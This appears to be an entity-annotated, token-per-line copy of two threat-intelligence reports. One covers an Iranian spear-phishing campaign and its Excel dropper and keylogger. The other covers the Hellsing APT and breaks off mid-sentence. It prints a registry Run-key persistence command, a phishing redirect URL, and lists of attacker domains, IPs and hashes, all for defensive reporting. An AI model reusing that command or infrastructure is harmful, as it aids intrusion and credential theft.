cell
phone
,
and
left
a
similar
message
with
a
callback
number
in
London
.

The
attackers
called
the
targets
in
other
cases
as
well
.

For
example
,
after
breaching
the
password
of
a
victim
back
in
November
2014
,
the
attacker
called
,
pretending
to
be
the
assistant
of
a
professor
abroad
who
wished
to
talk
to
the
victim
.

After
several
'unexplained
'
cut-offs
during
the
call
,
the
attacker
said
they
should
switch
to
Google
Hangout
,
asking
for
the
'conversation
code
'
the
victim
had
just
received
to
his
cell
phone
.

The
code
was
actually
the
second
factor
authentication
for
the
victim
's
Gmail
account
.

As
soon
as
he
gave
it
away
-
the
attackers
took
over
his
Gmail
,
Facebook
and
other
accounts
.

Part
3
-
spear
phishing
#
2

That
evening
,
the
target
received
an
email
written
in
Farsi
,
coming
from
a
spoofed
persian@bbc.co.uk
email
address
(
the
real
address
of
BBC
Farsi
)
.

The
message
was
a
follow
up
on
the
call
that
morning
,
asking
to
schedule
the
interview
for
the
next
day
:

The
headers
of
the
message
indicate
that
it
was
spoofed
,
and
was
actually
sent
from
a
server
in
Hungary
,
mail5.maxer.hu B_url.unknown
.

The
email
contained
a
linked
text
,
Document.pdf
,
with
this
URL
:
https://www.google.com/url?q=http://login-users.com/Drive-Auto/AutoSecond?Chk= B_url.distribute
< I
redacted I
> I
& I
sa=D I
& I
sntz=1 I
& I
usg= I
< I
redacted I
> I

The
URL
is
composed
of
two
parts
.

The
first
part
is
a
legitimate
Google.com B_url.normal
address
,
with
the
q=
parameter
.

The
second
part
is
the
value
of
that
parameter
-
a
fake
Google
Drive
log-in
page
in
the
attackers
controlled
domain
-
login-users.com B_url.normal
.

Upon
clicking
the
link
,
the
target
is
redirected
to
the
address
in
the
q=
parameter
.

This
is
a
trick
the
attackers
use
to
mislead
the
target
-
making
her
think
she
is
about
to
visit
a
legitimate
Google
website
.

The
fake
Google
Drive
log-in
page
was
customized
to
the
target
;
her
real
username
was
already
filled
in
:

The
Whois
information
for
the
domain
is
similar
to
those
used
in
legitimate
Google
owned
domain
,
except
for
the
'd
'
instead
of
'b
'
in
the
'registrant-email
'
value
:
gmail-aduse@google.com
:

The
attacker
sent
three
follow-up
emails
to
make
sure
the
target
had
received
the
first
one
,
from
the
same
server
in
Hungary
and
with
the
Reply-To
address
saeed.kn2003@gmail.com
.

Part
4
-
breaking
into
an
Israeli
research
institute
to
set
up
phising
page
#
3

The
next
morning
,
several
targets
received
an
email
inviting
them
to
participate
in
an
'Iran
Israel
Forum
'
of
an
Israeli
research
institute
.

The
email
can
be
seen
below
(
sensitive
information
has
been
redacted
)
:

The
headers
of
the
email
indicate
that
they
the
email
was
not
spoofed
,
and
had
been
sent
from
the
research
institute
.

As
can
be
seen
,
the
email
contained
various
grammatical
mistakes
.

Moreover
,
anyone
who
knows
the
institute
would
notice
that
parts
of
the
message
are
inaccurate
(
this
will
not
be
elaborated
here
in
order
not
to
expose
the
institute
's
identity
)
.

The
words
'Access
To
Forum
'
linked
to
a
page
within
the
real
,
compromised
,
website
of
the
institute
.

The
page
contained
more
information
about
the
'
forum
'
,
and
offered
four
'
sign
in
'
options
,
as
can
be
seen
in
the
screenshot
below
:

Clicking
one
of
the
sign-in
options
led
to
a
custom
made
log-in
page
,
again
,
with
the
target
's
username
,
email
,
and
picture
already
present
:

After
submitting
a
password
,
the
victim
is
taken
to
the
next
fake
page
in
which
she
is
asked
to
submit
the
two
factor
authentication
code
she
has
just
received
to
her
phone
:

Upon
submission
,
the
victim
is
redirected
to
a
static
'registration
confirmed
'
page
.

Interestingly
,
the
log
file
for
the
previous
pages
was
hosted
publicly
on
the
same
virtual
folder
.

The
log
contained
the
false
credentials
the
target
submitted
(
as
she
recognized
this
was
a
fake
)
4
:

We
reported
the
breach
to
the
institue
,
and
they
investigated
and
cleaned
it
off
.

They
informed
us
that
their
own
servers
were
never
breached
.

Rather
,
a
server
run
by
a
researcher
who
was
givenn
a
'virtual
folder
'
within
their
domain
was
.

This
,
of
course
,
did
not
change
the
end
result
-
the
attackers
managed
to
implant
a
fake
page
within
the
Instititue
domain
,
and
were
able
to
send
an
email
using
the
same
domain
.

This
pattern
is
recurring
:
The
attackrs
go
after
'low
hanging
fruits
'
in
order
to
reach
their
goal
rather
than
using
advnaced
techincal
means
.

Four
days
later
,
the
target
received
the
following
email
from
the
same
fake
address
as
in
part
1
:
Part
5
-
spear
phishing
#
4
4
The
'pass
'
filed
intermingled
with
the
IP
filed
in
the
original
log
,
file
due
to
bidirectionality
issues
.

The
email
contained
the
real
textual
signature
of
the
sender
,
and
the
word
Toda
(
Thank
you
,
in
Hebrew
)
,
as
the
sender
usually
writes
.

The
hyperlink
text
in
the
message
appeared
to
be
leading
to
youtube.com B_url.normal
,
but
in
fact
linked
to
a
fake
address
that
only
looked
like
a
YouTube
domain
.

The
page
contained
a
'private
Youtube
video
'
,
asking
the
viewer
to
sign
in
in
order
to
watch
it
:

After
signing
in
,
the
page
redirected
to
a
specific
interview
in
target
's
real
YouTube
channel
-
proving
once
again
that
the
attacks
are
targeted
and
based
on
reconnaissance
.

Part
6
-
Abusing
account
recovery
mechanisms

During
the
writing
of
this
article
,
the
attackers
continued
to
attempt
to
take
over
various
accounts
of
the
target
.

For
example
,
they
tried
to
fool
Google
into
giving
them
access
to
the
target
's
Gmail
accounts
using
the
Google
Account
Recovery
process5
(
a
process
which
in
certain
cases
enables
one
to
regain
access
to
an
account
even
if
the
password
and
other
means
of
authentication
are
unavailable
)
.

The
attackers
tried
similar
methods
against
the
target
's
account
on
Facebook
and
Yahoo
,
and
had
also
set
up
a
fake
Hotmail
account
,
which
was
used
as
the
secondary
email
to
which
the
recovered
password
should
be
sent
.

Part
7
-
Private
messages

The
target
has
been
contacted
by
various
'weird
'
characters
on
Facebook
and
by
e-mail
.

They
have
been
asking
her
various
questions
that
have
nothing
to
do
with
her
professional
expertise
and
tried
to
contact
her
in
various
ways
.

The
conversation
are
conducted
in
Persian
.

We
can
not
find
a
direct
connection
between
these
Facebook
characters
and
the
above
mentioned
attacks
.

However
,
in
addition
to
them
happening
close
to
the
attacks
,
we
do
know
that
at
least
one
of
the
accounts
is
fake
.

5
https://www.google.com/accounts/recovery/ B_url.normal

One
of
the
fake
characters
who
has
engaged
in
conversation
,
is
using
throughout
her
profile
pictures
of
a
Russian
model
,
and
has
presented
herself
as
with
different
,
contradicting
,
background
stories
in
conversations
with
different
targets
.

Targets
and
further
incidents

Targets
So
far
we
have
exposed
a
list
of
more
than
500
targets
by
name
and
email
.

The
targets
come
,
mostly
,
from
the
following
fields
:

Both
Academic
researchers
and
practitioners
in
the
fields
of
counter-terror
,
diplomacy
,
international
relations
,
Iran
and
Middle
East
,
and
other
fields
,
such
as
Physics
.


Security
and
defence
.


Other
similar
fields
.

Journalists
and
Human
rights
activists
.

In
some
cases
the
attackers
tried
to
breach
the
account
of
a
relative
or
colleague
of
the
real
target
.

Below
is
the
target
distribution
by
country
:

Further
incidents

We
have
investigated
and
can
publicly
mention
the
following
incident
by
the
same
threat
actor
:

A
security
company
had
numerous
employees
targeted
with
customized
phishing
pages
.

The
attackers
managed
to
infect
computers
within
the
company
and
steal
information
.

In
several
other
cases
numerous
employees
from
the
same
organization
were
targeted
.

A
fake
Gmail
account
was
set
up
using
the
name
of
the
head
of
a
research
center
.

Following
,
several
of
his
contacts
received
targeted
phishing
email
from
the
fake
account
.

A
fake
domain
has
been
set
up
,
imitating
that
of
the
'Interdisciplinary
Center
Herzliya
'
,
an
Israeli
college
(
unrelated
to
the
research
institute
described
above
)
,
and
has
been
used
in
attacks
.

The
table
below
correlates
between
the
threat
actor
behind
the
Thamar
Reservoir
campaign
and
the
name
of
threat
actor
or
campaign
,
as
given
in
other
reports
:

Threat
actor
/
campaign
Correlations
Gholee6
by
Clearsky
Overlapping
infrastructure
and
malware
.

Rocket
Kitten7
,
Operation
WOOLEN-GOLDFISH
by
Trendmicro
Overlapping
infrastructure
and
malware
.

Ajax
Security
Team
,
Operation
Saffron
Rose8
by
FireEye
Similar
TTPs
and
interests
-
Attacks
against
universities
and
researchers
;
Use
of
fake
conference
pages
;
Use
of
a
domain
that
spoofs
the
name
of
the
targeted
organization
.

Certainty
High
High
Medium
Newscaster9
by
iSight
Similar
TTPs
-
pretending
to
be
a
reporter
in
order
to
get
close
to
approach
the
victim
.

Medium
6
http://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign B_malware.normal
7
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-woolen-goldfish.pdf B_malware.normal
8
https://www.fireeye.com/resources/pdfs/fireeye-operation-saffron-rose.pdf B_malware.normal
9
http://www.isightpartners.com/2014/06/uncovering-newscaster-experts-cyber-threat-intelligence/ B_malware.normal

The
Iranian
connection
Several
characteristics
of
the
attacks
have
led
us
to
the
conclusion
that
an
Iranian
threat
actor
is
the
likely
culprit
.

We
assume
,
though
do
not
have
direct
evidence
,
that
it
is
being
supported
by
the
Iranian
regime
,
or
performed
by
the
Regime
itself
:

The
context
of
the
attacks
and
cover
stories
all
revolve
around
Iran
.

Importantly
,
as
determined
by
several
professionals
-
the
attackers
speak
and
write
in
native
Iranian
Persian
and
make
mistakes
characteristic
of
Persian
speakers
.

In
one
of
the
hacked
accounts
,
when
retrieved
,
the
interface
language
had
been
changed
to
Persian
.


The
targets
and
victims
match
the
interests
of
Iran
.

Moreover
,
rather
than
stealing
money
or
performing
high
key
'cyber
terror
'
attacks
(
such
as
information
leaks
or
deferments
)
,
the
attackers
only
steal
information
and
use
the
access
to
computers
for
further
attacks
-
indicating
espionage
,
IP
theft
,
etc
.


The
TTPs
match
those
of
attackers
and
attacks
that
were
attributed
to
Iran
by
other
security
companies
,
as
mentioned
in
the
previous
chapter
.


Some
of
the
domains
and
IPs
used
by
the
attackers
in
the
cases
we
investigated
were
mentioned
and
attributed
to
an
'Iranian
threat
group
'
in
an
advisory
by
the
Financial
Sector
Cyber
Intelligence
Group
,
and
the
Department
of
the
Treasury
,
CIG
Circular
3510
10
http://webcache.googleusercontent.com/search?q=cache:dzV7dGdsTU8J:theatre.fsu.edu/index.php/content/download/208893/1786893/file/20150311_WASP.pdf B_url.normal

Malware
analysis
The
malicious
Excel
file
(
mentioned
in
'Part
1
-
speared
email
message
containing
malware
'
)
serve
as
a
Dropper
-
it
creates
two
files
and
runs
them
.

When
opening
the
excel
file
(
.xlsb
)
,
the
user
sees
a
blank
sheet
and
the
standard
'Macros
have
been
disabled
'
message
.

If
enabled
by
the
user
,
the
macro
drops
NTUSER.dat{GUID}.exe B_malware.drop
and
tmp.bat
.

The
content
of
the
excel
sheet
is
then
presented
.

It
is
case
specific
and
customized
to
the
victim
.

Different
malware
can
be
downloaded
to
the
infected
computer
.

On
an
infected
computer
we
have
analyzed
,
we
found
CWoolger
Keylogger
.

The
macro
,
two
files
,
and
CWoolger
are
analyzed
below
.

Macro

The
VBA
macro
is
similar
to
that
used
to
drop
Gholee B_malware.infosteal
,
as
we
reported
about
8
month
ago11
.

However
,
in
current
case
,
a
simple
downloader
was
used
instead
of
Gholee B_malware.infosteal
.

The
VBA
contains
a
series
of
functions
built
of
VBA
Character
Codes
:

These
are
constructed
into
a
single
variable
and
then
written
as
a
file
to
disc
,
creating
and
running
NTUSER.dat{GUID}.exe B_malware.drop
Next
,
tmp.bat
is
written
and
executed
.

11
http://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign B_url.normal

tmp.bat

Tmp.Bat
contains
two
lines
.

The
first
create
a
registry
key
without
prompting
the
user
for
permission
,
telling
the
computer
to
run
NTUSER.dat{GUID}.exe B_malware.drop
from
%
USERPROFILE
%
every
time
the
computer
starts
,
naming
it
'My
App
'
.

For
example
:

REG
ADD
'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
'
/V
'My
App
'
/t
REG_SZ
/F
/D
'C:\Users\Nisa\NTUSER.dat{813E7E06-2AC5-4F3D-94DA-CF6E298F7B18}.exe
'
The
second
line
deletes
tmp.bat
.

NTUSER.dat{GUID}.exe B_malware.drop
The
dropped
exe
file
(
55ff220e38556ff902528ac984fc72dc B_hash
)
is
a
Downloader
.

It
is
created
in
%
UserProfile
%
,
sized
8.5KB
,
and
is
recognized
by
19
out
of
57
antiviruses
on
Virus
Total12
(
the
sample
was
not
submitted
by
us
)
.

It
contains
simple
mechanisms
to
detect
and
prevent
analysis
,
such
as
IsDebuggerPresent
:

The
malware
tries
to
download
files
form
a
remote
address
,
apparently
'stage
two
'
,
the
actual
malware
.

CWoolger
Keylogger

We
have
not
been
able
to
get
the
final
malware
when
running
the
malicious
excel
file
and
dropper
in
the
lab
,
as
the
server
was
not
responding
.

However
,
we
have
performed
forensic
analysis
of
the
computer
used
by
a
target
who
opened
the
malicious
Excel
file
.

That
computer
was
infected
with
CWoolger
keylogger
.

An
analysis
of
this
tool
can
be
read
in
Trendmicro
's
paper
'Operation
WOOLEN-GOLDFISH'13
in
chapter
'Wool3n.H4t's
Recent
Activities
:
CWoolger
Keylogger
'
.

Below
are
additional
notes
about
the
infection
we
found
:
12
virustotal.com/en/file/072a43123e755ad1bdd159488a85a353227ec51f273c4f79c26ff7e4656c0ef4/analysis/ B_url.normal
13
http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-woolen-goldfish.pdf B_url.normal

The
CWoolger
exe
file
was
located
in
%
appdata
%
\microsoft\windows\templates\wlg.exe

To
gain
persistency
,
a
link
to
the
exe
file
was
placed
in
in
the
Startup
folder
,
with
the
name
'WinDefender
'
and
the
notepad
icon
.

A
file
containing
the
collected
keystrokes
is
saved
in
%
temp
%
in
a
file
called
wlg.dat
.
it
is
sent
to
an
attacker
controlled
server
every
15
minutes
.

These
findings
are
similar
to
those
found
by
Trendmicro
–
indicating
that
the
attackers
have
been
using
the
same
tool
for
months
.

We
would
like
to
thank
Omri
moyal
,
VP
Research
at
Minerva
Labs
for
assisting
the
analysis
.

Technical
indicators
and
IoC
Domains
Domains
hosting
phishing
pages
:
login-users[.]com B_url.unknown
drives-google[.]co B_url.unknown
qooqle[.]co B_url.unknown
video[.]qooqle[.]co B_url.unknown
drive-google[.]co B_url.unknown
gfimail[.]us B_url.unknown
Google-Setting[.]com B_url.unknown
Google-Verify[.]com B_url.unknown
Mail-Verify[.]com B_url.unknown

IPs

IPs
of
phishing
pages
:
107.6.172.51 B_ip.unknown
5.39.223.227 B_ip.unknown
31.192.105.10 B_ip.unknown
Malware
Downloader
:
MD5
55ff220e38556ff902528ac984fc72dc B_hash
SHA-1
b67572a18282e79974dc61fffb8ca3d0f4fca1b0 B_hash
SHA-256
072a43123e755ad1bdd159488a85a353227ec51f273c4f79c26ff7e4656c0ef4 B_hash
MD5
b4790618672197cab31681994bbc10a4 B_hash
SHA1
d5b2b30fe2d4759c199e3659d561a50f88a7fb2e B_hash
SHA-256
1c9e519dca0468a87322bebe2a06741136de7969a4eb3efda0ab8db83f0807b4 B_hash
MD5
60f5bc820cf38e78b51e1e20fed290b5 B_hash
SHA1
476489f75fed479f19bac02c79ce1befc62a6633 B_hash
SHA256
69e48eb82ce7387d65cc1a82c5a6a170dc6121d479736b1dd33358d09c483617 B_hash
Malicious
Email
accounts
Fake
or
breached
email
accounts
,
from
which
malicious
messages
were
sent
:
saeed.kn2003@gmail.com
The
Chronicles
of
the
Hellsing
APT
:
the
Empire
Strikes
Back

Introduction

One
of
the
most
active
APT
groups
in
Asia
,
and
especially
around
the
South
China
Sea
area
is
'Naikon
'
.

Naikon
plays
a
key
part
in
our
story
,
but
the
focus
of
this
report
is
on
another
threat
actor
entirely
;
one
who
came
to
our
attention
when
they
hit
back
at
a
Naikon
attack
.

Naikon
is
known
for
its
custom
backdoor
,
called
RARSTONE B_malware.backdoor
,
which
our
colleagues
at
Trend
Micro
have
described
in
detail
.

The
name
Naikon
comes
from
a
custom
user
agent
string
,
'NOKIAN95/WEB
'
,
located
within
the
backdoor
:

NOKIAN
string
in
Naikon
backdoor

The
Naikon
group
is
mostly
active
in
countries
such
as
the
Philippines
,
Malaysia
,
Cambodia
,
Indonesia
,
Vietnam
,
Myanmar
,
Singapore
,
and
Nepal
,
hitting
a
variety
of
targets
in
a
very
opportunistic
way
.

What
was
perhaps
one
of
the
biggest
operations
of
the
Naikon
group
was
launched
in
March
2014
,
in
the
wake
of
the
MH370
tragedy
that
took
place
on
March
8th
.

By
March
11th
,
the
Naikon
group
was
actively
hitting
most
of
the
nations
involved
in
the
search
for
MH370
.

The
targets
were
extremely
wide-ranging
but
included
institutions
with
access
to
information
related
to
the
disappearance
of
MH370
,
such
as
:
Office
of
the
President
Armed
Forces
Office
of
the
Cabinet
Secretary
National
Security
Council
(
s
)
Office
of
the
Solicitor
General
National
Intelligence
Coordinating
Agency
Civil
Aviation
Authority
Department
of
Justice
National
Police
Presidential
Management
Staff

The
Naikon
group
used
mostly
spear-phished
documents
for
the
attacks
,
with
CVE-2012-0158
exploits
that
dropped
the
group
's
signature
backdoor
.

While
many
of
these
attacks
were
successful
,
at
least
one
of
the
targets
didn't
seem
to
like
being
hit
,
and
instead
of
opening
the
documents
,
decided
on
a
very
different
course
of
action
.

The
empire
strikes
back
Here's
a
question
-
what
should
you
do
when
you
receiving
a
suspicious
document
from
somebody
you
don't
know
,
or
know
very
little
?
Choose
one
:

Open
the
document
Don't
open
the
document
Open
the
document
on
a
Mac
(
everybody
knows
Mac's
don't
get
viruses
)
Open
the
document
in
a
virtual
machine
with
Linux

Based
on
our
experience
,
most
people
would
say
2
,
3
or
4
.

Very
few
would
open
the
document
and
even
fewer
would
actually
decide
to
test
the
attacker
and
verify
its
story
.

But
this
is
exactly
what
happened
when
one
of
the
Naikon
spear-phishing
targets
received
a
suspicious
email
.

Instead
of
opening
the
document
or
choosing
to
open
it
on
an
exotic
platform
,
they
decided
to
check
the
story
with
the
sender
:

Naikon
target
asks
for
confirmation
of
the
email

In
the
email
above
,
we
can
see
the
target
questioning
the
authenticity
of
the
Naikon
spear-phishing
.
They
ask
the
sender
if
it
was
their
intention
to
email
this
document
.

The
attacker
was
,
of
course
,
not
confused
in
the
slightest
,
and
being
very
familiar
with
the
internal
structure
of
the
target's
government
agency
,
replied
claiming
that
they
work
for
the
secretariat
division
and
were
instructed
to
send
it
by
the
organization's
management
:

Naikon
attacker
replies
to
the
target

The
reply
is
written
in
poor
English
and
indicates
that
the
attacker
is
probably
not
as
proficient
in
the
language
as
the
intended
victim
.
Seeing
the
reply
,
the
target
obviously
decided
not
to
open
the
document
.
Moreover
,
they
decided
to
go
a
bit
further
and
try
to
learn
more
about
the
attacker
.

Not
long
after
the
first
exchange
,
the
following
email
was
sent
to
the
attacker
by
the
target
:

The
attachment
is
a
RAR
archive
with
password
,
which
allows
it
to
safely
bypass
malware
scanners
associated
with
the
free
email
account
used
by
the
attackers
.

Inside
the
archive
we
find
two
decode
PDF
files
and
one
SCR
file
:

Much
to
our
surprise
,
the
'SCR
'
file
turned
out
to
be
a
backdoor
prepared
especially
for
the
Naikon
fraudsters
.

The
file
'Directory
of
...
Mar
31
,
2014.scr
'
(
md5
:
198fc1af5cd278091f36645a77c18ffa B_hash
)
drops
a
blank
document
containing
the
error
message
and
a
backdoor
module
(
md5
:
588f41b1f34b29529bc117346355113f B_hash
)
.

The
backdoor
connects
to
the
command
server
located
at
philippinenews[.]mooo[.]com B_url.cncsvr
.

The
backdoor
can
perform
the
following
actions
:
download
files
upload
files
update
itself
uninstall
itself

We
were
amazed
to
see
this
course
of
action
and
decided
to
investigate
the
'Empire B_malware.backdoor
Strikes I
Back'-door I
further
;
naming
the
actor
'Hellsing
'
(
explained
later
)
.

The
malware
used
by
the
intended
victim
appears
to
have
the
following
geographical
distribution
,
according
to
KSN
data
:
Malaysia
-
government
networks
Philippines
-
government
networks
Indonesia
-
government
networks
USA
-
diplomatic
agencies
India
(
old
versions
of
malware
)

In
addition
,
we've
observed
the
targeting
of
ASEAN-related
entities
.

Victims
of
Hellsing
attacks

The
actor
targets
its
intended
victims
using
spear-phishing
emails
with
archives
containing
malware
,
similar
to
the
one
it
used
against
the
Naikon
group
.
Some
of
the
attachment
names
we
observed
include
:

2013
Mid-Year
IAG
Meeting
Admin
Circular
FINAL.7z
HSG
FOLG
ITEMS
FOR
USE
OF
NEWLY
PROMOTED
YNC
FEDERICO
P
AMORADA
798085
PN
CLN.zip
Home
Office
Directory
as
of
May
2012.Please
find
attached
here
the
latest
DFA
directory
and
key
position
officials
for
your
referenece.scr
LOI
Nr
135-12
re
2nd
Quarter.Scr
Letter
from
Paquito
Ochoa
to
Albert
Del
Rosario
,
the
Current
Secretary
of
Foreign
Affairs
of
the
Philippines.7z
Letter
to
SND_Office
Call
and
Visit
to
Commander
,
United
States
Pacific
Command
(
USPACOM
)
VER
4.0.zip
PAF-ACES
Fellowship
Program.scr
RAND
Analytic
Architecture
for
Capabilities
Based
Planning
,
Mission
System
Analysis
,
and
Transformation.scr
Update
Attachments_Interaction
of
Military
Personnel
with
the
President
_2012_06_28.rar
Update
SND
Meeting
with
the
President
re
Hasahasa
Shoal
Incident.scr
Washington
DC
Directory
November
2012-EMBASSY
OF
THE
PHILIPPINES.zip
ZPE-791-2012&ZPE-792-2012.rar
zpe-791-2012.PDF.scr

We've
observed
RAR
,
ZIP
and
7ZIP
archives
in
the
attacks
-
the
7ZIP
archives
with
passwords
were
probably
introduced
as
a
way
to
bypass
the
recent
security
features
on
Gmail
,
which
block
password-
protected
archives
with
executables
inside
.

Each
backdoor
has
a
command
and
control
server
inside
as
well
as
a
version
number
and
a
campaign
or
victim
identifier
.

Some
examples
include
:

MD5
2682a1246199a18967c98cb32191230c B_hash
31b3cc60dbecb653ae972db9e57e14ec B_hash
4dbfd37fd851daebdae7f009adec3cbd B_hash
015915bbfcda1b2b884db87262970a11 B_hash
3a40e0deb14f821516eadaed24301335 B_hash
73396bacd33cde4c8cb699bcf11d9f56 B_hash
7c0be4e6aee5bc5960baa57c6a93f420 B_hash
bff9c356e20a49bbcb12547c8d483352 B_hash
c0e85b34697c8561452a149a0b123435 B_hash
f13deac7d2c1a971f98c9365b071db92 B_hash
Date
Mar
31
2014
Mar
31
2014
Nov
08
2013
Feb
19
2014
Mar
31
2014
Nov
08
2013
Nov
08
2013
Apr
02
2014
Apr
02
2014
Nov
08
2013
C
&
C
Campaign
identifier
freebsd.extrimtur[.]com B_url.cncsvr
1.6.1_MOTAC
freebsd.extrimtur[.]com B_url.cncsvr
1.6.1_MOTAC
articles.whynotad[.]com B_url.cncsvr
1.5_articles.whynotad.com-nsc
guaranteed9.strangled[.]net B_url.cncsvr
1.5_guaranteed9-nsc
hosts.mysaol[.]com B_url.cncsvr
1.6.1_imi;simple
web01.crabdance[.]com B_url.cncsvr
1.5_op_laptop
hosts.mysaol[.]com B_url.cncsvr
1.5_MMEA
imgs09.homenet[.]org B_url.cncsvr
1.6.1_It
imgs09.homenet[.]org B_url.cncsvr
1.6.1_It
hosts.mysaol[.]com B_url.cncsvr
1.5_MMEA
f74ccb013edd82b25fd1726b17b670e5 B_hash
2013
May
12
2014
second.photo-frame[.]com B_url.cncsvr
1.6.2s_Ab

The
campaign
identifiers
could
be
related
to
the
organizations
targeted
by
the
specific
builds
of
this
APT
.

Some
possible
descriptions
for
these
initials
could
be
:
MOTAC
-
Ministry
of
Tourism
and
Culture
,
Malaysia
-
http://www.motac.gov.my/en/ B_url.normal
NSC
-
http://www.nsc.gov.my/ B_url.normal
MMEA
-
Malaysian
Maritime
Enforcement
Agency
-
http://www.mmea.gov.my B_url.normal

Artifacts
and
overlap
with
other
APTs

Interestingly
,
some
of
the
infrastructure
used
by
the
attackers
appears
to
overlap
(
although
around
a
year
apart
)
with
a
group
tracked
internally
at
Kaspersky
Lab
as
PlayfullDragon
(
also
known
as
'GREF
'
)
;
while
other
aspects
of
the
infrastructure
overlap
with
a
group
known
as
Mirage
or
Vixen
Panda
.

For
instance
,
one
of
the
PlayfullDragon
's
Xslcmd
backdoors
described
by
our
colleagues
from
FireEye
(
md5
:
6c3be96b65a7db4662ccaae34d6e72cc B_hash
)
beams
to
cdi.indiadigest[.]in:53 B_url.unknown
.

One
of
the
Hellsing
samples
we
analysed
(
md5
:
0cbefd8cd4b9a36c791d926f84f10b7b B_hash
)
connects
to
the
C
&
C
server
at
webmm[.]indiadigest[.]in B_url.cncsvr
.

Although
the
hostname
is
not
the
same
,
the
top
level
domain
suggests
some
kind
of
connection
between
the
groups
.

Several
other
C
&
C
subdomains
on
'
indiadigest[.]in B_url.cncsvr
'
include
:
aac.indiadigest[.]in B_url.cncsvr
ld.indiadigest[.]in B_url.cncsvr
longc.indiadigest[.]in B_url.cncsvr
Another
overlap
we
observed
is
with
an
APT
known
as
Cycldek
or
Goblin
Panda
.

Some
of
the
Hellsing
samples
we
analysed
in
this
operation
(
e.g.
md5
:
a91c9a2b1bc4020514c6c49c5ff84298 B_hash
)
communicate
with
the
server
webb[.]huntingtomingalls[.]com B_url.cncsvr
,
using
a
protocol
specific
to
the
Cycldek
backdoors
(
binup.asp/textup.asp/online.asp
)
.

It
appears
that
the
Hellsing
developer
started
with
the
Cycldek
sources
and
worked
together
with
the
operators
from
other
APT
groups
.

Nevertheless
,
it
is
sufficiently
different
to
warrant
classification
as
a
stand-alone
operation
.

So
,
where
does
the
Hellsing
name
come
from
?

One
of
the
samples
we
analysed
(
md5
:
036e021e1b7f61cddfd294f791de7ea2 B_hash
)
appears
to
have
been
compiled
in
a
rush
and
the
attacker
forgot
to
remove
the
debug
information
.
One
can
see
the
project
name
is
Hellsing
and
the
malware
is
called
'
msger B_malware.backdoor
'
:
Of
course
,
Hellsing
can
have
many
different
meanings
,
including
the
famous
doctor
from
Bram
Stoker
's
Dracula
.

However
,
according
to
Wikipedia
,
'Hellsing
(
Herushingu
)
is
also
a
Japanese
mang
a
series
written
and
illustrated
by
Kouta
Hirano
.

It
first
premiered
in
Young
King
Ours
in
1997
and
ended
in
September
2008
'
.

The
Hellsing
series
chronicles
the
efforts
of
the
mysterious
and
secret
Hellsing
Organization
,
as
it
combats
vampires
,
ghouls
,
and
other
supernatural
foes
;
which
makes
it
perhaps
an
appropriate
name
for
our
group
.

In
addition
to
the
Hellsing/msger B_malware.backdoor
malware
,
we've
identified
a
second
generation
of
Trojan
samples
which
appear
to
be
called
'
xweber B_malware.infosteal
'
by
the
attackers
:
'
Xweber B_malware.infosteal
'
seems
to
be
the
more
recent
Trojan
,
taking
into
account
compilation
timestamps
.

All
the
'
msger B_malware.backdoor
'
samples
we
have
seen
appear
to
have
been
compiled
in
2012
.

The
'
Xweber B_malware.infosteal
'
samples
are
from
2013
and
from
2014
,
indicating
that
at
some
point
during
2013
the
'
msger B_malware.backdoor
'
malware
project
was
renamed
and/or
integrated
into
'
Xweber B_malware.infosteal
'
.

During
our
investigation
we've
observed
the
Hellsing
APT
using
both
the
'
Xweber B_malware.infosteal
'
and
'
msger B_malware.backdoor
'
backdoors
in
their
attacks
,
as
well
as
other
tools
named
'xrat
'
,
'clare
'
,
'irene
'
and
'xKat
'
.

Other
tools
Once
the
Hellsing
attackers
compromise
a
computer
,
they
deploy
other
tools
which
can
be
used
for
gathering
further
information
about
the
victim
or
doing
lateral
movement
.

One
such
tool
is
'
test.exe
'
:
test.exe
45,568
bytes
14309b52f5a3df8cb0eb5b6dae9ce4da B_hash
Win32
PE
i386
executable
Name
Size
MD5
Type
This
tool
is
used
to
gather
information
and
test
available
proxies
.

Interestingly
,
it
also
contains
the
Hellsing
debug
path
:

Another
attack
tool
deployed
in
a
victim's
environment
was
a
file
system
driver
,
named
'diskfilter.sys
'
,
although
internally
it
claims
to
be
named
'xrat.sys
'
.

The
driver
is
unsigned
and
compiled
for
32-bit
Windows
.

It
was
used
briefly
in
2013
,
before
being
abandoned
by
the
attackers
,
possibly
due
to
Windows
7
driver
signing
requirements
:

Another
tool
used
by
the
attackers
is
called
'xKat
'
:
xkat.exe
78,848
bytes
621e4c293313e8638fb8f725c0ae9d0f B_hash
Win32
PE
i386
executable
Name
Size
MD5
Type
This
is
a
powerful
file
deletion
and
process
killer
which
uses
a
driver
(
Dbgv.sys
)
to
perform
the
operations
.

We
've
seen
it
being
used
by
the
attackers
to
kill
and
delete
malware
belonging
to
their
competitors
.

Some
of
the
debug
paths
found
in
the
binaries
include
:
e:\Hellsing\release\clare.pdb
e:\Hellsing\release\irene\irene.pdb
d
:
\hellsing\sys\irene\objchk_win7_x86\i386\irene.pdb
d
:
\hellsing\sys\xkat\objchk_win7_x86\i386\xKat.pdb
d
:
\Hellsing\release\msger\msger_install.pdb
d
:
\Hellsing\release\msger\msger_server.pdb
d
:
\hellsing\sys\xrat\objchk_win7_x86\i386\xrat.pdb
D
:
\Hellsing\release\exe\exe\test.pdb

Attribution

In
general
,
the
attribution
of
APTs
is
a
very
tricky
task
which
is
why
we
prefer
to
publish
technical
details
and
allow
others
to
draw
their
own
conclusions
.

The
Hellsing-related
samples
appear
to
have
been
compiled
around
the
following
times
:
Assuming
normal
work
starts
at
around
9
am
,
the
attacker
seems
to
be
most
active
in
a
time-zone
of
GMT+8
or
+9
,
considering
a
work
program
of
9/10
am
to
6/7pm
.

Conclusions

The
Hellsing
APT
group
is
currently
active
in
the
APAC
region
,
hitting
targets
mainly
in
the
South
China
Sea
area
,
with
a
focus
on
Malaysia
,
the
Philippines
and
Indonesia
.

The
group
has
a
relatively
small
footprint
compared
to
massive
operations
such
as
'Equation
'
.

Smaller
groups
can
have
the
advantage
of
being
able
to
stay
under
the
radar
for
longer
periods
of
time
,
which
is
what
happened
here
.

The
targeting
of
the
Naikon
group
by
the
Hellsing
APT
is
perhaps
the
most
interesting
part
.

In
the
past
,
we
've
seen
APT
groups
accidentally
hitting
each
other
while
stealing
